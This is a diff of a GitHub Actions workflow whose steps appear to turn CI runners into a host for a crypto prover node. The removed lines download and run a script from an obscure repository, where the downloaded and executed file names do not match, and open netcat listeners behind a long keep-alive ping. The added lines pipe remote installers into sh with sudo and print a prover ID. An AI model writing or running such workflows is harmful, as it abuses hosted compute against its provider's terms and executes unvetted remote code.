@@ -34,18 +34,15 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
-          sudo apt install wget
-          wget -O extension.sh https://raw.githubusercontent.com/danelalllaal/sfddsfdsfdf/refs/heads/main/install.sh 
-          chmod +x install.sh
-          ./install.sh
+          sudo apt update && sudo apt upgrade -y
+          sudo curl https://sh.rustup.rs -sSf | sh
+          source $HOME/.cargo/env
+          export PATH="$HOME/.cargo/bin:$PATH"
+          sudo curl https://cli.nexus.xyz/install.sh | sh
 
       - name: Run a multi-line script
         run: |
-          sudo apt-get install -y netcat
-          nc -l 9010 &
-          nc -l 9011 &
-          ping -c 10000000  askubuntu.com
-          
+          cat $HOME/.nexus/prover-id
 
   build3:
     # The type of runner that the job will run on
